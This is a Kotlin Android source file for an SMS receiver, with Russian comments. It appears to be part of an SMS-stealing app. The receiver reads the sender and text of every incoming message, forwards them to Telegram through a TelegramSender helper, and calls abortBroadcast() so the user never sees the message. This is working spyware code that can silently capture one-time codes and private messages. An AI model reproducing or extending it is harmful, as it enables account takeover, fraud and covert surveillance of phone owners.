package com.analyzer.smsbeta

// 2. SmsReceiver.kt
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val bundle = intent.extras
            val pdus = bundle?.get("pdus") as Array<*>?

            pdus?.forEach { pdu ->
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                val sender = smsMessage.displayOriginatingAddress
                val messageBody = smsMessage.messageBody

                // Отправка данных в Telegram
                TelegramSender.sendToTelegram("SMS от: $sender\nСообщение: $messageBody")

                // Блокировка отображения SMS
                abortBroadcast()
            }
        }
    }
}